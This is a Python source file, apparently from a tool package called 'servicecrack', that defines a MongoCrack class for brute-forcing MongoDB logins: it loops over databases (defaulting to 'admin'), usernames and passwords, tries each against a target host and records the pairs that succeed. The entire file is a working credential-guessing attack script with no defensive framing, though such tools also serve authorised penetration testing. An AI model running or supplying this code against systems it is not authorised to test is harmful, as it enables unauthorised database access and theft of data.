# coding: utf-8
from pymongo import MongoClient

from servicecrack.service.Base import BaseCrack
from servicecrack.utils.logg import Logging

logging = Logging("mongo")
service_name = "mongo"


class MongoCrack(BaseCrack):
    def __init__(self, host, port, usernames, passwords, dbs=["admin"]):
        self.dbs = dbs
        super(MongoCrack, self).__init__(host, port, usernames, passwords, service_name)
        if not port:
            self.port = 27017

    def run(self):
        for db in self.dbs:
            for username in self.usernames:
                for password in self.passwords:
                    self.crack(username, password, db)
        logging.info("[+] brute {} ending".format(self.service_name))
        logging.info(self.result)

    def crack(self, username, password, db_name):
        logging.debug("start use {} {}".format(username, password))
        success = 0
        try:
            conn = MongoClient(self.host, self.port, connectTimeoutMS=self.timeout * 1000)
            db = conn[db_name]  # 这里默认使用admin 进行爆破
            db.authenticate(username, password)
            logging.info("[+] brute success :{} {}".format(username, password))
            success = 1
        except Exception as e:
            logging.debug(e)
            logging.debug("brute faild:{} {}".format(username, password))
            conn.close()
        finally:
            if not success:
                return
            conn.close()
            self.result.append({"username": username, "password": password, "db_name": db_name})



